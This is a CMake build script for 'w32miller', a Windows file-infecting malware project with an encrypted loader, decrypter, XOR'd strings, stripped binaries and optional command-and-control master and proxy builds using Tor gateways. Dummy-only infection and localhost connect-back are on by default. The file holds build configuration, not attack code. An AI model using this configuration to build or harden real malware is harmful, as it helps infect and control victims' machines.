cmake_minimum_required(VERSION 3.0.2)
set(CMAKE_MODULE_PATH "${CMAKE_CURRENT_SOURCE_DIR}/cmake")
set(BUILD_FROM_TOPDIR true)

include(CMakeBuildDeps)

set(ERR_DEPS_FIRST "\nRun ./deps/makedeps.sh first!")

set(NASM_BIN ${CMAKE_SOURCE_DIR}/deps/sysroot/i686-w64-mingw32/bin/nasm)
find_program(NASM ${NASM_BIN})
if(NOT NASM)
    message(FATAL_ERROR "${NASM_BIN} is required to compile DLL crt/loader/decrypter ${ERR_DEPS_FIRST}")
endif()
message(STATUS "nasm....: ${NASM_BIN}")

set(CMAKE_ASM_NASM_COMPILER ${NASM})

set(PYTHON_BIN ${CMAKE_SOURCE_DIR}/deps/sysroot/bin/python2.7)
find_program(PYTHON NAMES ${PYTHON_BIN})
if(NOT PYTHON)
  message(FATAL_ERROR "${PYTHON_BIN} is required for initial loader patching ${ERR_DEPS_FIRST}")
endif()
message(STATUS "python..: ${PYTHON}")

set(PYTHON_HDR ${CMAKE_SOURCE_DIR}/deps/sysroot/include/python2.7)
find_path(PYTHON_INCDIR NAMES Python.h HINTS ${PYTHON_HDR})
if(NOT PYTHON_INCDIR)
  message(FATAL_ERROR "${PYTHON_HDR}/Python.h is required for initial loader patching ${ERR_DEPS_FIRST}")
endif()
message(STATUS "Python.h: ${PYTHON_INCDIR}/Python.h")

set(ERR_HOST_TOOLS "is required for build pre-compilation host-tools (e.g. header encryption)")
find_program(HOSTCC NAMES ${CMAKE_SOURCE_DIR}/deps/sysroot/bin/gcc)
if(NOT HOSTCC)
    message(FATAL_ERROR "host gcc ${ERR_HOST_TOOLS} ${ERR_DEPS_FIRST}")
endif()
message(STATUS "hostcc..: ${HOSTCC}")

find_program(HOSTLD NAMES ${CMAKE_SOURCE_DIR}/deps/sysroot/bin/ld)
if(NOT HOSTLD)
    message(FATAL_ERROR "host ld ${ERR_HOST_TOOLS} ${ERR_DEPS_FIRST}")
endif()
message(STATUS "hostld..: ${HOSTLD}")

find_program(HOSTGO NAMES ${CMAKE_SOURCE_DIR}/deps/sysroot/bin/go)
if(NOT HOSTGO)
    message(FATAL_ERROR "host go ${ERR_HOST_TOOLS} ${ERR_DEPS_FIRST}")
endif()
message(STATUS "hostgo..: ${HOSTGO}")

include(CMakeMillerFuncs)

set(CMAKE_SYSTEM_NAME Windows)
set(TOOLCHAIN_PREFIX ${CMAKE_SOURCE_DIR}/deps/sysroot/i686-w64-mingw32/bin/i686-w64-mingw32)
set(CMAKE_C_COMPILER ${TOOLCHAIN_PREFIX}-gcc)
set(CMAKE_LINLER ${TOOLCHAIN_PREFIX}-ld)
set(CMAKE_RC_COMPILER_INIT ${TOOLCHAIN_PREFIX}-windres)
set(CMAKE_CXX_COMPILER false)
set(CMAKE_CXX_LINK_EXECUTABLE false)
set(CMAKE_INSTALL_PREFIX "/usr" CACHE STRING "install prefix" FORCE)

set(CMAKE_FIND_ROOT_PATH ${CMAKE_SOURCE_DIR}/deps/sysroot)
set(CMAKE_FIND_ROOT_PATH_MODE_PROGRAM NEVER)
set(CMAKE_FIND_ROOT_PATH_MODE_LIBRARY ONLY)
set(CMAKE_FIND_ROOT_PATH_MODE_INCLUDE ONLY)

set(INSTALL_DEST w32miller_shipped/bin CACHE STRING "install destination")
set(MILLER_HDRDIR "${CMAKE_SOURCE_DIR}/include" CACHE INTERNAL "" FORCE)
set(MILLER_HDRDIR_CREATED "${CMAKE_CURRENT_BINARY_DIR}/include" CACHE INTERNAL "" FORCE)
set(MILLER_SRCDIR "${CMAKE_SOURCE_DIR}/source" CACHE INTERNAL "" FORCE)
GetMillerSectionFromInclude("${MILLER_HDRDIR}/xor_strings.h" "DLLSECTION" tmp)
if(NOT tmp)
  message(FATAL_ERROR "unable to get miller section name from include file")
endif()
set(MILLER_API_VERSION 1 CACHE INTERNAL "" FORCE)
set(MILLER_SECTION ${tmp} CACHE STRING "default pe32 section name")
set(MILLER_SECTION_ADDRESS 0x40a000 CACHE STRING "sets libw32miller section adr")
set(MILLER_IMAGEBASE 0x10000000 CACHE STRING "default pe32 imagebase")
set(ENABLE_MSG_PIPES OFF CACHE BOOL "use named pipes for communication")
set(BUILD_TESTS OFF CACHE BOOL "build tests executable")
set(BUILD_ALL_TOOLS OFF CACHE BOOL "build decrypter/disasm/loader_decrypt test executables")
set(BUILD_CNCMASTER OFF CACHE BOOL "build the command and control center: master instance")
set(BUILD_CNCPROXY OFF CACHE BOOL "build the command and control center: forwarding proxy instance")
set(ENABLE_IRC OFF CACHE BOOL "enable IRC support (deprecated/obsolete)")
set(HTTP_LOCALHOST ON CACHE BOOL "client uses localhost as connect back adr instead of web2tor gateways")
set(INFECT_DUMMY ON CACHE BOOL "malware will ONLY infect dummy.exe in the current working dir")
set(EXTRA_VERBOSE ON CACHE BOOL "print additional debugging information (_PRE_RELEASE only!)")

unset(tmp)
GetMillerSectionFromInclude("${MILLER_HDRDIR}/xor_strings.h" "LDRSECTION" tmp)
if(NOT tmp)
  message(FATAL_ERROR "unable to get loader section name from include file")
endif()

set(LOADER_SECTION ${tmp} CACHE STRING "default pe32 loader section name")
set(LOADER_ENDMARKER "0xde,0xad,0xc0,0xde" CACHE STRING "loader endmarker, see include/loader.h, FORMAT must be 0x11,0x22,0x33,0x44,...")
string(REPLACE " " "" LOADER_ENDMARKER ${LOADER_ENDMARKER})
set(DECRYPTER_X86 decrypter_x86 CACHE INTERNAL "" FORCE)
set(LOADER_X86 loader_x86 CACHE INTERNAL "" FORCE)
set(LOADER_HEADER ${MILLER_HDRDIR_CREATED}/${LOADER_X86}.h CACHE INTERNAL "" FORCE)
set(LOADER_CRYPT ${MILLER_HDRDIR_CREATED}/${LOADER_X86}_crypt.h CACHE INTERNAL "" FORCE)

if(ENABLE_MSG_PIPES)
  set(pipes_defs _USE_PIPES=1)
endif()
set(MILLER_PRE_DEFS "_API_VERSION=${MILLER_API_VERSION}" "_PRE_RELEASE=1" "${pipes_defs}" CACHE INTERNAL "" FORCE)
set(MILLER_DEFS "_API_VERSION=${MILLER_API_VERSION}" "${pipes_defs}" CACHE INTERNAL "" FORCE)
set(LOADERBASE_DEFS _MILLER_IMAGEBASE=${MILLER_IMAGEBASE} _MILLER_SECTION=${MILLER_SECTION} _LDR_SECTION=${LOADER_SECTION} _LOADER_ENDMARKER=${LOADER_ENDMARKER} "" CACHE INTERNAL "" FORCE)

set(CMAKE_C_FLAGS "-Wall -Wextra -Werror -std=gnu99" CACHE INTERNAL "" FORCE)
set(default_cflags "-Wno-cast-function-type -Wno-implicit-fallthrough -Wno-switch -Wno-address-of-packed-member -ffast-math -fno-trapping-math -fno-stack-check -fno-stack-protector -mno-stack-arg-probe -fvisibility=hidden -fomit-frame-pointer -fexpensive-optimizations -Os -static -fdata-sections -ffunction-sections -falign-functions=1 -falign-jumps=1 -falign-loops=1 -fno-unwind-tables -fno-asynchronous-unwind-tables -fno-unroll-loops -fmerge-all-constants -fno-ident -fno-zero-initialized-in-bss" CACHE INTERNAL "" FORCE)
set(default_ldflags "-s -nostdlib -nodefaultlibs -nostartfiles -Wl,--exclude-all-symbols -Wl,--exclude-libs,msvcrt.a -Wl,-e,_start -Wl,--gc-sections -Wl,--strip-all -Qn -Wl,--subsystem,windows -fPIE -Wl,--dynamicbase -Wl,--nxcompat -Wl,-rpath-link,${CMAKE_SOURCE_DIR}/batch/miller_linker_script.ld ${CMAKE_SOURCE_DIR}/batch/miller_linker_script.ld" CACHE INTERNAL "" FORCE)
set(miller_cflags "-fno-builtin -ffreestanding -D_INC_STRING=1 -D_CRT_ALLOCATION_DEFINED=1 -D_MALLOC_H_=1 -D_PROCESSENV_=1 -D_WINCON_=1 -D_STDIO_DEFINED=1" CACHE INTERNAL "" FORCE)

project(w32miller C)
set(CMAKE_VERBOSE_MAKEFILE ON)
set(CMAKE_RULE_MESSAGES OFF)

set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/lib)
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/lib)
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${CMAKE_BINARY_DIR}/bin)

set(STAMP_DIR ${CMAKE_RUNTIME_OUTPUT_DIRECTORY} CACHE INTERNAL ".stamp files output directory" FORCE)
set(LOADER_HEADER_STAMP ${STAMP_DIR}/.loader-header-build CACHE INTERNAL "" FORCE)
set(LOADER_CRYPT_STAMP ${STAMP_DIR}/.loader-crypt-header-build CACHE INTERNAL "" FORCE)

file(MAKE_DIRECTORY ${MILLER_HDRDIR_CREATED})
# build host tools first (hdr_crypt, python modules)
include(CMakeMillerHostTools)
# build CRT, Loader and DLL
include(CMakeMillerBuild)
# build Windows tools
include(CMakeMillerTools)
# build Windows tests
include(CMakeMillerTests)

# if you are building in-source, this is the same as CMAKE_SOURCE_DIR, otherwise 
# this is the top level directory of your build tree 
MESSAGE(STATUS "CMAKE_BINARY_DIR........: " ${CMAKE_BINARY_DIR})

# if you are building in-source, this is the same as CMAKE_CURRENT_SOURCE_DIR, otherwise this 
# is the directory where the compiled or generated files from the current CMakeLists.txt will go to 
MESSAGE(STATUS "CMAKE_CURRENT_BINARY_DIR: " ${CMAKE_CURRENT_BINARY_DIR})

# this is the directory, from which cmake was started, i.e. the top level source directory 
MESSAGE(STATUS "CMAKE_SOURCE_DIR........: " ${CMAKE_SOURCE_DIR})

# this is the directory where the currently processed CMakeLists.txt is located in 
MESSAGE(STATUS "CMAKE_CURRENT_SOURCE_DIR: " ${CMAKE_CURRENT_SOURCE_DIR})

# contains the full path to the top level directory of your build tree 
MESSAGE(STATUS "PROJECT_BINARY_DIR......: " ${PROJECT_BINARY_DIR})

# contains the full path to the root of your project source directory,
# i.e. to the nearest directory where CMakeLists.txt contains the PROJECT() command 
MESSAGE(STATUS "PROJECT_SOURCE_DIR......: " ${PROJECT_SOURCE_DIR})

# this is the complete path of the cmake which runs currently (e.g. /usr/local/bin/cmake) 
MESSAGE(STATUS "CMAKE_COMMAND...........: " ${CMAKE_COMMAND})

# this is the CMake installation directory 
MESSAGE(STATUS "CMAKE_ROOT..............: " ${CMAKE_ROOT})

# the complete system name, e.g. "Linux-2.4.22", "FreeBSD-5.4-RELEASE" or "Windows 5.1" 
MESSAGE(STATUS "CMAKE_SYSTEM............: " ${CMAKE_SYSTEM})

# the short system name, e.g. "Linux", "FreeBSD" or "Windows"
MESSAGE(STATUS "CMAKE_SYSTEM_NAME.......: " ${CMAKE_SYSTEM_NAME})

# is TRUE on all UNIX-like OS's, including Apple OS X and CygWin
if(UNIX)
  MESSAGE(STATUS "UNIX....................: " ${UNIX})
endif()

# WIN32 is TRUE on Windows (including CygWin)
# MINGW is TRUE for all mingw toolchains (mingw, mingw64)
if(NOT WIN32 OR NOT MINGW)
  MESSAGE(FATAL_ERROR "Miller requires a *FULL* mingw64 toolchain! ${ERR_DEPS_FIRST}")
endif()
MESSAGE(STATUS "WIN32...................: " ${WIN32})

# is TRUE when using the MinGW compiler in Windows
MESSAGE(STATUS "MINGW...................: " ${MINGW})

# If set, runtime paths are not added when using shared libraries. Default it is set to OFF
MESSAGE(STATUS "CMAKE_SKIP_RPATH........: " ${CMAKE_SKIP_RPATH})

# set this to true if you are using makefiles and want to see the full compile and link 
# commands instead of only the shortened ones 
MESSAGE(STATUS "CMAKE_VERBOSE_MAKEFILE..: " ${CMAKE_VERBOSE_MAKEFILE})

# A simple way to get switches to the compiler is to use ADD_DEFINITIONS(). 
# But there are also two variables exactly for this purpose: 

# the compiler used for C files 
MESSAGE(STATUS "CMAKE_C_COMPILER........: " ${CMAKE_C_COMPILER})
MESSAGE(STATUS "CMAKE_LINKER............: " ${CMAKE_LINLER})

# if the compiler is a variant of gcc, this should be set to 1 
MESSAGE(STATUS "CMAKE_COMPILER_IS_GNUCC.: " ${CMAKE_COMPILER_IS_GNUCC})

# the tools for creating libraries 
MESSAGE(STATUS "CMAKE_AR................: " ${CMAKE_AR})
MESSAGE(STATUS "CMAKE_RANLIB............: " ${CMAKE_RANLIB})
MESSAGE(STATUS "CMAKE_OBJCOPY...........: " ${CMAKE_OBJCOPY})

# nasm
MESSAGE(STATUS "NASM....................: " ${NASM})

# default (C|LD)flags
MESSAGE(STATUS "CMAKE CFLAGS............: " ${CMAKE_C_FLAGS})
if(CMAKE_LD_FLAGS)
  MESSAGE(STATUS "CMAKE LDFLAGS...........: " ${CMAKE_LD_FLAGS})
endif()
MESSAGE(STATUS "DEFAULT CFLAGS..........: " ${default_cflags})
MESSAGE(STATUS "DEFAULT LDFLAGS.........: " ${default_ldflags})
# miller output
MESSAGE(STATUS "MILLER CFLAGS...........: " ${miller_cflags})
MESSAGE(STATUS "MILLER SECTION..........: " ${MILLER_SECTION})
MESSAGE(STATUS "LOADER SECTION..........: " ${LOADER_SECTION})
MESSAGE(STATUS "ENDMARKER...............: " ${LOADER_ENDMARKER})
MESSAGE(STATUS "LOADERBASE DEFS.........: " ${LOADERBASE_DEFS})
MESSAGE(STATUS "MILLER DEFS.............: " ${MILLER_DEFS})
MESSAGE(STATUS "MILLER PRE DEFS.........: " ${MILLER_PRE_DEFS})
string(REPLACE ";" ", " DISTORM_SRC_OUT "${DISTORM_SRC}")
string(REPLACE ";" ", " MILLER_SRC_OUT "${MILLER_SRC}")
string(REPLACE ";" ", " TESTS_SRC_OUT "${TESTS_SRC}")
MESSAGE(STATUS "DISTORM SOURCES.........: " ${DISTORM_SRC_OUT})
MESSAGE(STATUS "MILLER SOURCES..........: " ${MILLER_SRC_OUT})
MESSAGE(STATUS "CRT, LOADER, DECRYPTER..: " ${CRT_X86_SRC} ", " ${LOADER_X86_SRC} ", " ${DECRYPTER_X86_SRC})
MESSAGE(STATUS "TESTS SOURCES...........: " ${TESTS_SRC_OUT})
MESSAGE(STATUS "BUILD CNCMASTER.........: " ${BUILD_CNCMASTER})
MESSAGE(STATUS "BUILD CNCPROXY..........: " ${BUILD_CNCPROXY})

if(NOT DISTORM_SRC OR NOT MILLER_SRC OR NOT TESTS_SRC)
  MESSAGE(FATAL_ERROR "Some sources are missing: Maybe changed some CMake scripts at the wrong place?")
endif()
if(NOT CRT_X86_SRC)
  MESSAGE(FATAL_ERROR "${CRT_X86} missing")
endif()
if(NOT LOADER_X86_SRC)
  MESSAGE(FATAL_ERROR "${LOADER_X86} missing")
endif()
if(NOT DECRYPTER_X86_SRC)
  MESSAGE(FATAL_ERROR "${DECRYPTER_X86} missing")
endif()

MESSAGE(STATUS "Performing Compilation Tests ..")
CompileCSource("int main(void) { return 0; }" DC_RESULT "${CMAKE_C_FLAGS} ${default_cflags}" "" "" "" TRUE)
CompileCSource("int main(void) { return 0; }" DLD_RESULT "${CMAKE_C_FLAGS} ${default_cflags} ${default_ldflags}" "" "" "" TRUE)
CompileCSource("int main(void) { return 0; }" EDLD_RESULT "${CMAKE_C_FLAGS} ${default_cflags} ${miller_cflags} ${default_ldflags}" "" "" "" TRUE)
if(NOT DC_RESULT OR NOT DLD_RESULT OR NOT EDLD_RESULT)
  MESSAGE(FATAL_ERROR "Some compiler/linker flags are not accepted by your compiler/linker. ${ERR_DEPS_FIRST}")
endif()
